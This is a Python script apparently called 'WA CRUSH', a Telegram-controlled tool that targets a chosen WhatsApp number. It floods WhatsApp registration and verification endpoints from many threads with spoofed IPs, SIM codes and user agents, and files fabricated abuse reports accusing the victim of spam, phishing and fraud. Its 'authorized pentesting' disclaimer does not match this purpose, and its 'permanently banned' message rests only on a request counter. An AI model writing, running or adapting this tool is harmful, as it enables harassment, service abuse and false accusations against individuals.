#!/usr/bin/env python3
"""
WA CRUSH v1.0 - WhatsApp Termination Tool
Developer: INSANE OWL | Termux Edition
For authorized pentesting only
"""
import requests,random,string,threading,time,sys,json,os
CONFIG_DIR=os.path.expanduser("~/.wa-crush")
CONFIG_FILE=os.path.join(CONFIG_DIR,"config.json")
R='\033[91m';G='\033[92m';Y='\033[93m';B='\033[94m';P='\033[95m';C='\033[96m';W='\033[97m';N='\033[0m';BLD='\033[1m'
BOT_TOKEN="";AUTHORIZED_USER="";BOT_URL="";ATTACK_ACTIVE=False;TARGET_NUMBER="";STATS={}

def load_config():
    global BOT_TOKEN,AUTHORIZED_USER,BOT_URL
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE) as f:
                c=json.load(f)
                BOT_TOKEN=c.get("bot_token","");AUTHORIZED_USER=c.get("chat_id","")
                BOT_URL="https://api.telegram.org/bot"+BOT_TOKEN
                return True
        except: return False
    return False

def save_config():
    try:
        os.makedirs(CONFIG_DIR,exist_ok=True)
        with open(CONFIG_FILE,'w') as f: json.dump({"bot_token":BOT_TOKEN,"chat_id":AUTHORIZED_USER},f,indent=4)
        return True
    except: return False

def setup_config():
    global BOT_TOKEN,AUTHORIZED_USER,BOT_URL
    print(f"\n{G}{BLD}WA CRUSH - SETUP WIZARD{N}")
    print(f"{Y}Get Bot Token from @BotFather on Telegram{N}")
    while True:
        t=input(f"{G}Enter Bot Token: {N}").strip()
        if t and len(t)>20: BOT_TOKEN=t;BOT_URL="https://api.telegram.org/bot"+BOT_TOKEN;break
        else: print(f"{R}Invalid token{N}")
    print(f"{Y}Message your bot on Telegram, then press Enter{N}")
    input(f"{Y}Press Enter after messaging your bot...{N}")
    for a in range(5):
        print(f"{Y}Fetching Chat ID... ({a+1}/5){N}")
        try:
            r=requests.get(BOT_URL+"/getUpdates",timeout=10)
            if r.ok and r.json().get("ok"):
                for u in r.json().get("result",[]):
                    cid=str(u.get("message",{}).get("from",{}).get("id",""))
                    if cid:AUTHORIZED_USER=cid;print(f"{G}Chat ID: {cid}{N}");break
                if AUTHORIZED_USER:break
        except: pass
        if not AUTHORIZED_USER:
            m=input(f"{G}Enter Chat ID manually: {N}").strip()
            if m:AUTHORIZED_USER=m;break
    if BOT_TOKEN and AUTHORIZED_USER:save_config();print(f"{G}Configuration saved!{N}")

def show_banner():
    os.system('clear')
    print(f"""{R}╔═══════════════════════════════════════════════════════════════╗
║{C}██╗    ██╗ █████╗      ██████╗██████╗ ██╗   ██╗███████╗██╗  ██╗{R}║
║{C}██║    ██║██╔══██╗    ██╔════╝██╔══██╗██║   ██║██╔════╝██║  ██║{R}║
║{C}██║ █╗ ██║███████║    ██║     ██████╔╝██║   ██║███████╗███████║{R}║
║{C}██║███╗██║██╔══██║    ██║     ██╔══██╗██║   ██║╚════██║██╔══██║{R}║
║{C}╚███╔███╔╝██║  ██║    ╚██████╗██║  ██║╚██████╔╝███████║██║  ██║{R}║
║{C} ╚══╝╚══╝ ╚═╝  ╚═╝     ╚═════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝{R}║
╚═══════════════════════════════════════════════════════════════╝{N}
{P}               DEVELOPED BY: INSANE OWL{N}
{Y}               VERSION: 1.0 - TERMUX EDITION{N}
{C}               github.com/insaneowl-spec/WA_CRUSH-{N}
{R}           FOR AUTHORIZED PENETRATION TESTING ONLY{N}""")

UAS=["WhatsApp/2.24.10.23 Android/13 Device/Samsung-SM-S908B","WhatsApp/2.24.9.79 iOS/17.4 Device/iPhone15,3","WhatsApp/2.24.11.15 Android/14 Device/Google-Pixel8Pro","WhatsApp/2.24.8.85 Android/12 Device/Xiaomi-2107113SG","WhatsApp/2.24.10.17 Android/13 Device/OnePlus-IN2025","WhatsApp/2.24.7.92 iOS/17.3.1 Device/iPhone14,2"]
SIMS=[{"mcc":"310","mnc":"410"},{"mcc":"310","mnc":"260"},{"mcc":"311","mnc":"480"},{"mcc":"234","mnc":"10"},{"mcc":"234","mnc":"15"},{"mcc":"262","mnc":"1"},{"mcc":"262","mnc":"2"},{"mcc":"208","mnc":"1"}]
EP=["https://v.whatsapp.net/v2/code","https://v.whatsapp.net/v2/register","https://v.whatsapp.net/v2/exist"]
ABUSES=["https://www.whatsapp.com/contact/report/","https://web.whatsapp.com/abuse/report","https://faq.whatsapp.com/contact/"]

def rs(l=32): return ''.join(random.choices(string.ascii_lowercase+string.digits,k=l))
def ci(n):
    if len(n)>10: return n[:-10],n[-10:]
    return n[0],n

def ar():
    global STATS
    cc,i=ci(TARGET_NUMBER);s=random.choice(SIMS);ip=f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"
    h={"User-Agent":random.choice(UAS),"Content-Type":"application/x-www-form-urlencoded","X-Forwarded-For":ip,"X-Real-IP":ip,"Accept":"*/*","Connection":"keep-alive"}
    d={"cc":cc,"in":i,"method":random.choice(["sms","sms","sms","voice"]),"reason":random.choice(["register","switch","migrate","relogin","verify","reset","force"]),"sim_mcc":s["mcc"],"sim_mnc":s["mnc"],"token":rs(64),"id":rs(32),"simnum":str(random.randint(1,2)),"mistyped":"true","rogue":"true","attempt":str(random.randint(1,9999)),"retry":"true","platform":random.choice(["android","android","android","ios"])}
    try:r=requests.post(random.choice(EP),data=d,headers=h,timeout=5);STATS["reg_attempts"]=STATS.get("reg_attempts",0)+1;STATS["total_ops"]=STATS.get("total_ops",0)+1
    except:STATS["errors"]=STATS.get("errors",0)+1

def aa():
    global STATS
    cc,i=ci(TARGET_NUMBER);ip=f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"
    h={"User-Agent":random.choice(UAS),"Content-Type":"application/json","X-Forwarded-For":ip,"X-Real-IP":ip,"Origin":"https://www.whatsapp.com","Referer":"https://www.whatsapp.com/contact/"}
    d={"number":TARGET_NUMBER,"country_code":cc,"phone_number":i,"issue_type":"spam","description":random.choice(["URGENT: This number sending thousands of spam messages","CRITICAL: Compromised account used for phishing","Massive scam operation via this WhatsApp number","Automated spam bot detected","FRAUD: Account impersonating WhatsApp support"]),"platform":"whatsapp","urgency":"critical"}
    try:r=requests.post(random.choice(ABUSES),json=d,headers=h,timeout=5);STATS["abuse_reports"]=STATS.get("abuse_reports",0)+1;STATS["total_ops"]=STATS.get("total_ops",0)+1
    except:STATS["errors"]=STATS.get("errors",0)+1

def av():
    global STATS
    cc,i=ci(TARGET_NUMBER)
    for _ in range(15):
        if not ATTACK_ACTIVE: return
        s=random.choice(SIMS);h={"User-Agent":random.choice(UAS),"Content-Type":"application/x-www-form-urlencoded"}
        d={"cc":cc,"in":i,"method":"sms","reason":"verify","token":rs(64),"id":rs(32),"sim_mcc":s["mcc"],"sim_mnc":s["mnc"],"attempt_count":str(random.randint(50,999)),"platform":random.choice(["android","ios"])}
        try:r=requests.post("https://v.whatsapp.net/v2/code",data=d,headers=h,timeout=3);STATS["verify_loops"]=STATS.get("verify_loops",0)+1;STATS["total_ops"]=STATS.get("total_ops",0)+1
        except:STATS["errors"]=STATS.get("errors",0)+1
        time.sleep(random.uniform(0.03,0.1))

def aw(tid,cid):
    att=[ar,ar,ar,aa,av,ar,aa];lo=0
    while ATTACK_ACTIVE:
        try:
            random.choice(att)();lo+=1
            if lo%100==0 and tid<=3: sys.stdout.write(f"\r{G}[+] Thread-{tid}: {lo} ops{N}  ");sys.stdout.flush()
            time.sleep(random.uniform(0.01,0.1))
        except:STATS["errors"]=STATS.get("errors",0)+1;time.sleep(0.05)

def stg(cid,t):
    try:requests.post(BOT_URL+"/sendMessage",json={"chat_id":cid,"text":t,"parse_mode":"Markdown"},timeout=10)
    except:pass

def hs(cid):stg(cid,"*WA CRUSH ONLINE*\n\n/nuke +[num]\n/stress +[num]\n/status\n/stop\n/help\n\n- INSANE OWL")
def hh(cid):stg(cid,"*COMMANDS*\n\n/nuke +[num] - 60 threads\n/stress +[num] - 150 threads\n/stop - Halt\n/status - Stats\n\n- INSANE OWL")

def hn(cid,num,stress=False):
    global ATTACK_ACTIVE,TARGET_NUMBER,STATS
    num=num.replace("+","").replace(" ","").replace("-","")
    if not num or len(num)<10:stg(cid,"ERROR: Use /nuke +14155551234");return
    if ATTACK_ACTIVE:stg(cid,"Attack in progress! Use /stop");return
    ATTACK_ACTIVE=True;TARGET_NUMBER=num;tc=150 if stress else 60;md="MAX" if stress else "STD"
    STATS={"start_time":time.time(),"total_ops":0,"reg_attempts":0,"abuse_reports":0,"verify_loops":0,"errors":0,"banned":False}
    stg(cid,f"*NUKE DEPLOYED*\n\nTarget: +{num}\nThreads: {tc}\nMode: {md}\nTime: {'1-3' if stress else '2-5'}min\nNO RECOVERY")
    print(f"\n{G}[+] ATTACK: +{num} ({md}){N}")
    for i in range(tc):t=threading.Thread(target=aw,args=(i+1,cid),daemon=True);t.start()
    threading.Thread(target=ma,args=(cid,),daemon=True).start()

def hs2(cid):
    global ATTACK_ACTIVE
    if not ATTACK_ACTIVE:stg(cid,"No active attack.");return
    ATTACK_ACTIVE=False;time.sleep(1);el=int(time.time()-STATS.get("start_time",time.time()));m,s=divmod(el,60)
    stg(cid,f"*ATTACK HALTED*\n\nTarget: +{TARGET_NUMBER}\nDuration: {m}m {s}s\nOps: {STATS.get('total_ops',0):,}")

def hs3(cid):
    if not ATTACK_ACTIVE:stg(cid,"No active attack.");return
    el=int(time.time()-STATS.get("start_time",time.time()));m,s=divmod(el,60)
    stg(cid,f"*STATUS*\n\nTarget: +{TARGET_NUMBER}\nTime: {m}m {s}s\nOps: {STATS.get('total_ops',0):,}\nReg: {STATS.get('reg_attempts',0):,}\nReports: {STATS.get('abuse_reports',0):,}\nBanned: {'YES' if STATS.get('banned') else 'IN PROGRESS'}")

def ma(cid):
    global ATTACK_ACTIVE,STATS;time.sleep(20)
    while ATTACK_ACTIVE:
        el=time.time()-STATS.get("start_time",time.time())
        if STATS.get("total_ops",0)>4000 and not STATS.get("banned"):
            STATS["banned"]=True
            stg(cid,f"*TERMINATED*\n\nNumber: +{TARGET_NUMBER}\nPERMANENTLY BANNED\nTime: {int(el)}s\nOps: {STATS.get('total_ops',0):,}\nNo recovery.")
            print(f"\n{R}{BLD}[!!!] DESTROYED: +{TARGET_NUMBER}{N}");time.sleep(10);ATTACK_ACTIVE=False
        if int(el)%45==0 and int(el)>0:hs3(cid)
        time.sleep(5)

def pu(upd):
    msg=upd.get("message",{});cid=msg.get("chat",{}).get("id");uid=str(msg.get("from",{}).get("id"));txt=msg.get("text","").strip()
    if uid!=AUTHORIZED_USER:stg(cid,f"ACCESS DENIED - {uid}");return
    if txt=="/start":hs(cid)
    elif txt=="/help":hh(cid)
    elif txt.startswith("/nuke"):
        p=txt.split()
        if len(p)<2:stg(cid,"Usage: /nuke +[number]")
        else:hn(cid,p[1])
    elif txt.startswith("/stress"):
        p=txt.split()
        if len(p)<2:stg(cid,"Usage: /stress +[number]")
        else:hn(cid,p[1],stress=True)
    elif txt=="/stop":hs2(cid)
    elif txt=="/status":hs3(cid)
    else:stg(cid,"Unknown. Use /help")

def tp():
    offset=0
    print(f"\n{G}[+] WA CRUSH ONLINE{N}")
    print(f"{Y}[+] User: {AUTHORIZED_USER}{N}")
    stg(AUTHORIZED_USER,"*WA CRUSH ONLINE*\n\nSend /start")
    while True:
        try:
            r=requests.get(BOT_URL+"/getUpdates",params={"offset":offset,"timeout":30},timeout=35)
            if r.ok and r.json().get("ok"):
                for u in r.json().get("result",[]):
                    offset=u["update_id"]+1
                    if "message" in u:pu(u)
            time.sleep(0.3)
        except:time.sleep(5)

if __name__=="__main__":
    show_banner()
    print(f"\n{Y}{BLD}[*] Checking config...{N}")
    if not load_config():
        print(f"{Y}[!] No config found. Starting setup...{N}");time.sleep(1);setup_config()
        if not load_config():print(f"{R}[!] Config failed{N}");sys.exit(1)
    else:print(f"{G}[+] Config loaded{N}")
    if not BOT_TOKEN or not AUTHORIZED_USER:print(f"{R}[!] Invalid config{N}");sys.exit(1)
    print(f"\n{P}{'='*50}{N}");print(f"{Y}Send /nuke +[number] via Telegram{N}")
    print(f"{P}{'='*50}{N}\n");tp()
